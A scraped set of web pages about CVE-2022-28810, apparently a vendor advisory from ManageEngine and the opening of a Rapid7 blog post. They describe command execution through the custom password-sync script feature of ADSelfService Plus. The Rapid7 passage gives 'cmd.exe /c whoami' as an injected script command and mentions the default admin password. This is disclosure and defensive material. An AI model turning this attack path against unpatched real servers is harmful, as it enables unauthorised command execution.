Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from www.manageengine.com_e17c04ad_20250108_125452.html ===


[Pricing](https://www.manageengine.com/products/self-service-password/pricing-details.html#pricing?rhsFixed) [Get Quote](/products/self-service-password/get-quote.html?rhsFixed)

[![ManageEngine ADSelfService Plus](https://www.manageengine.com/images/logo/adselfserviceplus.svg "ManageEngine ADSelfService Plus")](/products/self-service-password/)

[Download](/products/self-service-password/download.html?topMenu "Download")

* [Overview](/products/self-service-password/?topMenu "Overview")
* [Email Download Link](/products/self-service-password/email-download-link.html?topMenu "Email Download Link")
* [Features](/products/self-service-password/features.html?topMenu "Features")
* [Demo](/products/self-service-password/demo-form.html?topMenu "Demo")
* [Documents](/products/self-service-password/self-service-password-help-docs.html?topMenu "Documents")
* [Get Quote](/products/self-service-password/get-quote.html?topMenu "Get Quote")
* [Support](/products/self-service-password/support.html?topMenu "Support")
* [Customers](/products/self-service-password/customers.html?topMenu "Customers")

[Email Download Link ![email-download-top](https://www.manageengine.com/mobile/images/email-download-top.png)](/products/self-service-password/email-download-link.html?topMenu)

## Security Advisory

[Self Service Password Management](https://www.manageengine.com/products/self-service-password/index.html?breadcrumbs "Self Service Password Management") ¬ª Security Advisory

* [![Download free edition](https://www.manageengine.com/images/download.png)¬†¬†Free Edition](/products/self-service-password/download-free.html?lhs "Free Edition")
* Quick Links
  + [Get Quote](/products/self-service-password/get-quote.html?lhs "Get Quote")
  + [Extend Trial License](/products/self-service-password/request-evaluation-license.html?lhs "Extend Trial License")
  + [Online Demo](http://demo.adselfserviceplus.com/?lhs "Online Demo")
  + [Request Support](/products/self-service-password/request-support.html?lhs "Request Support")
  + [Compare Edition](/products/self-service-password/pricing-details.html?lhs#Editioncompare "Compare Edition")
  + [Success Stories](/products/self-service-password/adselfservice-plus-success-stories.html?lhs "Success Stories")
  + [Pricing & Purchase](https://store.manageengine.com/self-service-password/index.html?lhs "Pricing & Purchase")
  + [ROI Calculator](https://www.manageengine.com/products/self-service-password/adselfserviceplus-roi-calculator.html?lhs "ROI Calculator")
* Password Self-Service
  + [Self-service password reset](/products/self-service-password/self-service-password-reset.html?lhs "Self-service password reset")
  + [Self-service account unlock](/products/self-service-password/self-service-account-unlock.html?lhs "Self-service account unlock")
  + [Active Directory Change password](/products/self-service-password/active-directory-change-password.html?lhs "Active Directory Change password")
  + [Password Expiration Notification](/products/self-service-password/password-expiration-notifier.html?lhs "Password Expiration Notification")
  + [Password Policy Enforcer](/products/self-service-password/password-policy-enforcer.html?lhs "Password Policy Enforcer")
  + [Endpoint multi-factor authentication](/products/self-service-password/endpoint-multi-factor-authentication.html?lhs "Endpoint multi-factor authentication")
  + [Windows/macOS/Linux Logon Integration](/products/self-service-password/self-service-login-agent-for-windows-mac-os.html?lhs "Windows/macOS/Linux Logon Integration")
  + [Multi-factor Authentication](/products/self-service-password/active-directory-multi-factor-authentication.html?lhs "Multi-factor Authentication")
  + [Windows Logon Two-factor Authentication](/products/self-service-password/windows-logon-two-factor-authentication.html?lhs "Windows Logon Two-factor Authentication")
  + [Remote Password Reset](/products/self-service-password/remote-password-reset.html?lhs "Remote Password Reset")
  + [Endpoint multi-factor authentication for macOS](/products/self-service-password/endpoint-multi-factor-authentication-for-macos.html?lhs "Endpoint multi-factor authentication for macOS")
  + [Cached Credentials Update](/products/self-service-password/update-windows-active-directory-cached-credentials.html?lhs "Cached Credentials Update")
  + [Mobile Password Management](https://www.manageengine.com/mobile-apps/adselfservice-plus-mobile-app.html?lhs "Mobile Password Management")
* Documents
  + [Help Documents](/products/self-service-password/self-service-password-help-docs.html "Help Documents")
  + [Success Stories](/products/self-service-password/adselfservice-plus-success-stories.html "Success Stories")
  + [Video Zone](/products/self-service-password/adselfservice-plus-videos.html "Video Zone")
  + [Datasheet & Brochures](/products/self-service-password/document.html "Datasheet & Brochures")
  + [Knowledge Base](/products/self-service-password/kb/knowledge-base.html "Knowledge Base")
  + [White Papers](/products/self-service-password/adselfservice-whitepaper.html "Whitepapers")
  + [Solution Briefs](/products/self-service-password/solution-briefs.html "Solution Briefs")
* Key Topics
  + [Business Benefits of Self Service](/products/self-service-password/benefits.html "Self Service Password Reset Business Benefits")
  + [Identity Password Management](/products/self-service-password/identity-password-management.html "Active Directory Identity Password Management")
  + [ADSelfService Plus Screenshots](/products/self-service-password/self-service-portal.html "Self Service Screenshots")

* Related Products
  + [ADManager Plus](https://www.manageengine.com/products/ad-manager/index.html?lhsadssp "ADManager Plus")
    [Active Directory Management & Reporting](https://www.manageengine.com/products/ad-manager/index.html?lhsadssp "Active Directory Management & Reporting")
  + [ADAudit Plus](https://www.manageengine.com/products/active-directory-audit/index.html?lhsadssp "ADAudit Plus")
    [Hybrid AD, cloud, and file auditing and security](https://www.manageengine.com/products/active-directory-audit/index.html?lhsadssp "Hybrid AD, cloud, and file auditing and security")
  + [Exchange Reporter Plus](https://www.manageengine.com/products/exchange-reports/index.html?lhsadssp "Exchange Reporter Plus")
    [Exchange Server Auditing & Reporting](https://www.manageengine.com/products/exchange-reports/index.html?lhsadssp "Exchange Server Auditing & Reporting")
  + [EventLog Analyzer](https://www.manageengine.com/products/eventlog/index.html?lhsadssp "EventLog Analyzer")
    [Real-time Log Analysis & Reporting](https://www.manageengine.com/products/eventlog/index.html?lhsadssp "Real-time Log Analysis & Reporting")
  + [M365 Manager Plus](https://www.manageengine.com/microsoft-365-management-reporting/index.html?lhsadssp "M365 Manager Plus")
    [Microsoft 365 Management & Reporting Tool](https://www.manageengine.com/microsoft-365-management-reporting/index.html?lhsadssp "Microsoft 365 Management & Reporting Tool")
  + [DataSecurity Plus](https://www.manageengine.com/data-security/index.html?lhsadssp "DataSecurity Plus")
    [File server auditing & data discovery](https://www.manageengine.com/data-security/index.html?lhsadssp "File server auditing & data discovery")
  + [RecoveryManager Plus](https://www.manageengine.com/ad-recovery-manager/index.html?lhsadssp "RecoveryManager Plus")
    [Enterprise backup and recovery tool](https://www.manageengine.com/ad-recovery-manager/index.html?lhsadssp "Enterprise backup and recovery tool")
  + [SharePoint Manager Plus](https://www.manageengine.com/sharepoint-management-reporting/index.html?lhsadssp "RecoveryManager Plus")
    [SharePoint Reporting and Auditing](https://www.manageengine.com/sharepoint-management-reporting/index.html?lhsadssp "Enterprise backup and recovery tool")
  + [AD360](https://www.manageengine.com/active-directory-360/index.html?lhsadssp "AD360")
    [Integrated Identity & Access Management](https://www.manageengine.com/active-directory-360/index.html?lhsadssp "Integrated Identity & Access Management")
  + Log360 ([On-Premise](https://www.manageengine.com/log-management/index.html?lhsadssp "Log360 On-Premise") | [Cloud](https://www.manageengine.com/cloud-siem/?lhsadssp "Log360 Cloud"))
    [Comprehensive SIEM and UEBA](https://www.manageengine.com/log-management/index.html?lhsadssp "Comprehensive SIEM and UEBA")
  + [AD Free Tools](https://www.manageengine.com/products/free-windows-active-directory-tools/free-active-directory-tools-index.html?lhsadssp "AD Free Tools")
    [Active Directory FREE Tools](https://www.manageengine.com/products/free-windows-active-directory-tools/free-active-directory-tools-index.html?lhsadssp "Active Directory FREE Tools")

# CVE-2022-28810 - ManageEngine ADSelfService Plus

| Vulnerability details | |
| --- | --- |
| **Severity** | **High** |
| **CVE ID** | CVE-2022-28810 |
| **Affected software versions** | Builds 6121 and below |
| **Fixed version** | Build 6122 |
| **Fixed on** | April 9, 2022 |

## Details

CVE-2022-28810 refers to a security vulnerability reported in ManageEngine ADSelfService Plus that could lead to remote command execution when administrators enabled custom scripts for password sync with required providers, and set the passwords to be sent as arguments during the sync process. When performing a password change or reset, an authenticated end-user could exploit this vulnerability by entering a CMD command in the password field, and have it run remotely on the machine the ADSelfService Plus server is installed in.

We have now released ADSelfService Plus build 6122 with the following updates to fix this issue:

* Only VBScript and PowerShell files are allowed for custom script.
* All the script will now be stored strictly in the <Installation Directory> /Scripts folder.
* Newly set passwords are encoded and sent to the script as parameters.
* Passwords are sent as string literals instead of arguments to avoid unauthorized execution of commands.

## Impact

An authenticated end-user can execute remote codes on the machine where ADSelfService Plus is installed.

## Steps to upgrade

Update your ADSelfService Plus instance to 6122 using the [service pack](https://www.manageengine.com/products/self-service-password/service-pack.html).

## Post-upgrade

After upgrading to build 6122, follow [these guidelines](https://www.manageengine.com/products/self-service-password/kb/custom-script-security-considerations.html), for better security when using custom scripts.

## Acknowledgements

This issue was reported by Hernan Diaz, Andrew Iwamaye, Dan Kelly, and Jake Baines of Rapid7 via our Zoho Bug Bounty program.

#### Request for Support

Need further assistance? Fill this form, and we'll contact you rightaway.

* Name
* Business Email *\**
* Phone *\**
* Problem Description *\**
* Country
* By clicking 'Submit' you agree to processing of personal data according to the [Privacy Policy](https://www.manageengine.com/privacy.html).

Highlights
#### [Password self-service](https://www.manageengine.com/products/self-service-password/self-service-password-reset.html?Highlights)

Free Active Directory users from attending lengthy help desk calls by allowing them to self-service their password resets/ account unlock tasks.¬†Hassle-free password change for Active Directory users with ADSelfService Plus √¢¬Ä¬òChange Password√¢¬Ä¬ô console.

#### [One identity with Single sign-on](https://www.manageengine.com/products/self-service-password/enterprise-sso-solution.html?Highlights)

Get seamless one-click access to 100+ cloud applications. With enterprise single sign-on, users can access all their cloud applications with their Active Directory credentials. Thanks to ADSelfService Plus!

#### [Password/Account Expiry Notification](https://www.manageengine.com/products/self-service-password/password-expiration-notifier.html?Highlights)

Intimate Active Directory users of their impending password/account expiry by mailing them these password/account expiry notifications.

#### [Password Synchronizer](https://www.manageengine.com/products/self-service-password/active-directory-password-synchronizer.html?Highlights)

Synchronize Windows Active Directory user password/account changes across multiple systems, automatically, including¬†Office 365, G Suite, IBM iSeries and more.

#### [Password Policy Enforcer](https://www.manageengine.com/products/self-service-password/password-policy-enforcer.html?Highlights)

Ensure strong user passwords that resist various hacking threats with ADSelfService Plus by enforcing Active Directory users to adhere to compliant passwords via displaying password complexity requirements.

#### [Directory Self-Update](https://www.manageengine.com/products/self-service-password/self-service-ad-update.html?Highlights "Directory Self-Update") &¬†[Corporate Search](https://www.manageengine.com/products/self-service-password/employee-search.html?Highlights "Corporate Directory Search")

Portal that lets Active Directory users update their latest information and a quick search facility to scout for information about peers by using search keys, like contact number, of the personality being searched.

[√Ç¬´ Home](/products/self-service-password/index.html "Homepage of Active Directory Password Self Service")
[Knowledge Base √Ç¬ª](/products/self-service-password/kb/knowledge-base.html "Knowledge Base Home")

### ADSelfService Plus trusted by

[![Toshiba](/products/self-service-password/images/logo-toshiba.png "Toshiba")](https://www.manageengine.com/products/self-service-password/customers.html)
[![IBM](/products/self-service-password/images/logo-ibm.png "IBM")](https://www.manageengine.com/products/self-service-password/customers.html)

[![CHSi](/products/self-service-password/images/logo-chsi.png "CHSi")](https://www.manageengine.com/products/self-service-password/customers.html)
[![Symantec](/products/self-service-password/images/logo-symantec.png "Symantec")](https://www.manageengine.com/products/self-service-password/customers.html)

[![Alcatel Lucent](/products/self-service-password/images/logo-alcatel-lucent.png "Alcatel Lucent")](https://www.manageengine.com/products/self-service-password/customers.html)
[![Northrop Grumman](/products/self-service-password/images/logo-northrop-grumman.png "Northrop Grumman")](https://www.manageengine.com/products/self-service-password/customers.html)

[![L & T Infotech](/products/self-service-password/images/logo-landt-infotech.png "L & T Infotech")](https://www.manageengine.com/products/self-service-password/customers.html)
[![Cisco](/products/self-service-password/images/logo-cisco.png "Cisco")](https://www.manageengine.com/products/self-service-password/customers.html)

[![Ebay](/products/self-service-password/images/logo-ebay.png "Ebay")](https://www.manageengine.com/products/self-service-password/customers.html)

Embark on a journey towards identity security and Zero Trust
Password management
Adaptive MFA
Enterprise SSO
Self-service & security
Related products

* [Self-service password reset](https://www.manageengine.com/products/self-service-password/self-service-password-reset.html?footer)
* [Self-service account unlock](https://www.manageengine.com/products/self-service-password/self-service-account-unlock.html?footer)
* [Web-based domain password change](https://www.manageengine.com/products/self-service-password/active-directory-change-password.html?footer)
* [Password expiration notifications](https://www.manageengine.com/products/self-service-password/password-expiration-notifier.html?footer)

* [Password synchronization](https://www.manageengine.com/products/self-service-password/active-directory-password-synchronizer.html?footer)
* [Password policy enforcer](https://www.manageengine.com/products/self-service-password/password-policy-enforcer.html?footer)
* [Cached credentials update](https://www.manageengine.com/products/self-service-password/update-windows-active-directory-cached-credentials.html?footer)
* [Reporting and auditing](https://www.manageengine.com/products/self-service-password/reports-and-email-notification.html?footer)

* [Password self-service from logon screens](https://www.manageengine.com/products/self-service-password/self-service-login-agent-for-windows-mac-os.html?footer)
* [Mobile password management](https://www.manageengine.com/mobile-apps/adselfservice-plus-mobile-app.html?footer)
* [Password security and compliance](https://www.manageengine.com/products/self-service-password/password-security-compliance.html?footer)
* [Active Directory password audit](https://www.manageengine.com/products/self-service-password/active-directory-password-audit.html?footer)

* [Active Directory MFA](https://www.manageengine.com/products/self-service-password/active-directory-multi-factor-authentication.html?footer)
* [Conditional access](https://www.manageengine.com/products/self-service-password/conditional-access-policy.html?footer)
* [Passwordless authentication](https://www.manageengine.com/products/self-service-password/passwordless-authentication.html?footer)
* [Two-factor authentication](https://www.manageengine.com/products/self-service-password/two-factor-authentication.html?footer)

* [Endpoint MFA](https://www.manageengine.com/products/self-service-password/endpoint-multi-factor-authentication.html?footer)
* [MFA for remote and local Windows logons](https://www.manageengine.com/products/self-service-password/windows-logon-two-factor-authentication.html?footer)
* [MFA for remote and local macOS](https://www.manageengine.com/products/self-service-password/endpoint-multi-factor-authentication-for-macos.html?footer) and [Linux logons](https://www.manageengine.com/products/self-service-password/endpoint-multi-factor-authentication-for-linux.html?footer)
* [MFA for VPN](https://www.manageengine.com/products/self-service-password/multi-factor-authentication-for-secured-vpn.html?footer) and [OWA logons](https://www.manageengine.com/products/self-service-password/multi-factor-authentication-mfa-for-owa.html?footer)

* [FIDO2 MFA](/products/self-service-password/fido2-authentication.html?footer)
* [MFA for UAC](https://www.manageengine.com/products/self-service-password/multi-factor-authentication-mfa-for-uac.html?footer)
* [Offline MFA](https://www.manageengine.com/products/self-service-password/offline-multi-factor-authentication.html?footer)
* [Device-based MFA](https://www.manageengine.com/products/self-service-password/machine-based-multifactor-authentication-mfa.html?footer)

* [SAML SSO](https://www.manageengine.com/products/self-service-password/saml-sso-integration-active-directory.html?footer)
* [OAuth and OIDC SSO](https://www.manageengine.com/products/self-service-password/oauth-oidc-single-sign-on-sso.html?footer)
* [MFA for cloud apps](https://www.manageengine.com/products/self-service-password/multi-factor-authentication-for-cloud-apps-security.html?footer)

* [Passwordless authentication](https://www.manageengine.com/products/self-service-password/passwordless-authentication.html?footer)
* [Just-in-time provisioning](/products/self-service-password/just-in-time-provisioning.html?footer)
* [SIEM integration](https://www.manageengine.com/products/self-service-password/adselfserviceplus-siem-integration.html?footer)

* [ITSM integration](https://www.manageengine.com/products/self-service-password/adselfserviceplus-servicedesk-plus-integration.html?footer#integration)
* [IAM integration](https://www.manageengine.com/products/self-service-password/adselfserviceplus-servicedesk-plus-integration.html?footer)

* [Self-service group management](https://www.manageengine.com/products/self-service-password/self-service-ad-mail-group-subscription.html?footer)
* [Directory self-update](https://www.manageengine.com/products/self-service-password/active-directory-self-update.html?footer)
* [Employee search](https://www.manageengine.com/products/self-service-password/employee-search.html?footer)

* [Organization chart](https://www.manageengine.com/products/self-service-password/employee-search.html?footer#org-chart)
* [Approval-based workflow for self-service](https://www.manageengine.com/products/self-service-password/help-desk-assisted-password-self-service.html?footer)
* [Post-action notifications](https://www.manageengine.com/products/self-service-password/active-directory-password-self-service-notifications.html?footer)

* [Security and its importance](https://www.manageengine.com/products/self-service-password/self-service-password-application-security-importance.html?footer)
* [Endpoint security](https://manageengine.com/products/self-service-password/endpoint-security.html?footer)

* [Active
  Directory Management & Reporting](https://www.manageengine.com/products/ad-manager/index.html?adssp-related-products "Active Directory Management & Reporting")
* [Exchange Server
  Auditing & Reporting](https://www.manageengine.com/products/exchange-reports/index.html?adssp-related-products "Exchange Server Auditing & Reporting")
* [Active
  Directory Backup & Recovery Tool](https://www.manageengine.com/ad-recovery-manager/index.html?adssp-related-products "Active Directory Backup & Recovery Tool")
* [Active
  Directory FREE Tools](https://www.manageengine.com/products/free-windows-active-directory-tools/free-active-directory-tools-index.html?adssp-related-products "Active Directory FREE Tools")
* [All
  Windows AD Tools](https://www.manageengine.com/windows-active-directory-tools.html?adssp-related-products "All Windows AD Tools")

* [Active Directory Auditing](https://www.manageengine.com/products/active-directory-audit/index.html?adssp-related-products "Active Directory Auditing")
* [File server auditing
  & data discovery](https://www.manageengine.com/data-security/?adssp-related-products "File server auditing & data discovery")
* [SharePoint
  Management and Auditing Solution](https://www.manageengine.com/sharepoint-management-reporting/index.html?adssp-related-products "SharePoint Management and Auditing Solution")
* [Integrated
  Identity & Access Management (AD360)](https://www.manageengine.com/active-directory-360/index.html?adssp-related-products "Integrated Identity & Access Management (AD360)")

* [Real-time
  Log Analysis and Reporting Solution](https://www.manageengine.com/products/eventlog/?adssp-related-products "Real-time Log Analysis and Reporting Solution")
* [Microsoft
  365 Management & Reporting Tool](https://www.manageengine.com/microsoft-365-management-reporting/index.html?adssp-related-products "Microsoft 365 Management & Reporting Tool")
* [Cloud
  Security & Log Management](https://www.manageengine.com/cloud-security/index.html?adssp-related-products "Cloud Security & Log Management")
* [Comprehensive
  threat mitigation & SIEM (Log360)](https://www.manageengine.com/log-management/index.html?adssp-related-products "Comprehensive threat mitigation & SIEM (Log360")

* [Download](/products/self-service-password/download.html?btmMenu "Download")
* [Live Demo](http://demo.adselfserviceplus.com/?btmMenu "Live Demo")
* [Compare Editions](https://www.manageengine.com/products/self-service-password/pricing-details.html?btmMenu#Editioncompare "Compare Editions")
* [Free Edition](/products/self-service-password/download-free.html?btmMenu "Free Edition")
* [Get Quote](/products/self-service-password/get-quote.html?btmMenu "Get Quote")
* [Buy Now](https://store.manageengine.com/self-service-password/?btmMenu "Buy Now")



=== Content from packetstormsecurity.com_0b54f716_20250108_125450.html ===

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

[![](/logos/smalllogobeta.png)](/)

* files
* news
* users
* cve

![](/logos/linegray.png)

¬†[About](/help/view/4) |
[Terms](/tos/) |
[Copyright](/help/view/7) |
[Privacy](/help/view/6) |
[BlueSky](https://bsky.app/profile/packetstorm.bsky.social) |
[X](https://x.com/packet_storm) |
[Mastodon](https://infosec.exchange/%40packet_storm/)



=== Content from www.rapid7.com_a2782b01_20250108_125454.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)¬†Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# CVE-2022-28810: ManageEngine ADSelfService Plus Authenticated Command Execution (Fixed)

* Apr 14, 2022
* 4 min read
* [Jake Baines](/blog/author/jake-baines/)

*Last updated at Thu, 25 Jul 2024 19:20:22 GMT*

On April 9, 2022, ManageEngine fixed [CVE-2022-28810](https://www.manageengine.com/products/self-service-password/kb/cve-2022-28810.html) with the release of ADSelfService Plus Build 6122. The vulnerability allowed the `admin` user to execute arbitrary operating system commands and potentially allowed partially authenticated Active Directory users to execute arbitrary operating system commands via the password reset functionality. Rapid7‚Äôs Managed Detection and Response (MDR) team has observed this custom scripts feature in ADSelfService Plus being abused in the wild by remote attackers with valid administrative credentials.

## Credit

This vulnerability was discovered by Rapid7 researchers Jake Baines, Hernan Diaz, Andrew Iwamaye, and Dan Kelly.

## Exploitation

The vulnerability arose from a feature that allowed the `admin` user to execute arbitrary operating system commands after a password reset or account lockout status update.

![](https://blog.rapid7.com/content/images/2022/04/image1-3.png)

The example provided by the UI is `cscript test.vbs %userName %password%` where `test.vbs` is supposed to be a file stored in `C:\ManageEngine\ADSelfService Plus\bin` by a user with local access to the underlying operating system. But the reality is that any commands could be stored here. An attacker that acquired the `admin` user‚Äôs password (default: admin) could trivially achieve remote command execution this way.

For example, the attacker could use the script command ‚Äúcmd.exe /c whoami,‚Äù and when a user resets their password, the command ‚Äúwhoami‚Äù is executed.

![](https://blog.rapid7.com/content/images/2022/04/image4-2.png)

